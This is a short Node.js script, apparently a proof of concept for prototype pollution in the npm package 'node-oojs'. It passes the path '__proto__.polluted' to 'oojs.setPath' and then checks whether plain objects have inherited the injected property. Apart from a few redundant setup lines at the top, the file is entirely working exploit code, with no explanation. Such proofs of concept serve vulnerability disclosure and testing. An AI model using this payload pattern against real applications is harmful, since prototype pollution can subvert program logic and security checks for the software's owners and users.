var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
require('node-oojs');
oojs.setPath({ '__proto__.polluted': 'yes' });
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}